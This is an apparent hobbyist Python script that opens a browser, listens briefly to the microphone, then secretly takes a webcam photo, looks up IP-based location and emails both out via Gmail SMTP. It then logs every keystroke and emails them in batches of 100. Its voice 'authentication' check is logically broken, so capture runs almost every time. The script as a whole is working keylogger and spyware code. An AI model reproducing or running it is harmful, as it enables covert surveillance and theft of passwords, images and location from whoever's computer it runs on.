from pynput.keyboard import Key, Listener
import webbrowser
import speech_recognition as sr #pip install SpeechRecognition, #pip install pipwin, pipwin install pyaudio
import requests
import cv2 #pip install opencv-python
import smtplib, ssl
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders

count = 0
keysArray = []

def listToString(inputString):
    finalString = ""
    for element in inputString:
        finalString += str(element)
    return finalString

def keyTyped(key):
    print(key)
    global keysArray
    global count
    count = count +1
    if count != 100:
        keysArray.append(key)
    elif count == 100:
        message = listToString(keysArray)
        port = 465
        sender, passw = credentials()
        receive = sender
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
            server.login(sender, passw)
            server.sendmail(sender, receive, message)
        count = 0
        keysArray = []

def escape(key):
    if key == Key.esc:
        return False
def getLocation():
    res = requests.get('https://ipinfo.io/')
    data = res.json()
    ip = data['ip']
    city = data['city']
    latitudeLongitude = data['loc'].split(',')
    latitude = latitudeLongitude[0]
    longitude = latitudeLongitude[1]
    locationInfo = []
    locationInfo.append(city)
    locationInfo.append(ip)
    locationInfo.append(latitude)
    locationInfo.append(longitude)
    return locationInfo #returns location as [city, ip address, latitude, longitude]

def credentials():
    user = passw = ""
    with open ("credentials.txt", "r") as f:
        file = f.readlines()
        user = file[0].strip()
        passw = file[1].strip()
    return user, passw

def takePicture():
    cam = cv2.VideoCapture(0)
    s, img = cam.read()
    if s:
        cv2.namedWindow("picture")
        cv2.imshow("picture", img)
        cv2.waitKey(25)
        cv2.destroyWindow("picture")
        cv2.imwrite("pictureOf.jpg", img)

def sendLocationPicture():
    location = getLocation()  # location = [city, ip address, latitude, longitude]
    takePicture()
    filename = "pictureOf.jpg"
    port = 465
    sender, passw = credentials()
    receive = sender
    message = location[0] + " " + location[1] + " " + location[2] + " " + location[3]
    msg = MIMEMultipart()
    msg["From"] = sender
    msg["to"] = receive
    msg["Subject"] = "Hello"
    msg.attach(MIMEText(message, "plain"))
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {filename}", )
    msg.attach(part)
    text = msg.as_string()

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(sender, passw)
        server.sendmail(sender, receive, text)

webbrowser.open("www.google.com")

try:
    r = sr.Recognizer()
    with sr.Microphone() as source:
        text = r.listen(source, phrase_time_limit=8)
        newText = r.recognize_google(text)
        if ("stop program" not in newText or "close program" not in newText):
            sendLocationPicture()
            with Listener(on_press=keyTyped, on_release=escape) as listener:
                listener.join()  # logs every key pressed and does not stop until user presses escape
        else:
            print("Authenticated User, Program Shutting Down...")
except sr.UnknownValueError:
    sendLocationPicture()
    with Listener(on_press=keyTyped, on_release=escape) as listener:
        listener.join()  # logs every key pressed and does not stop until user presses escape
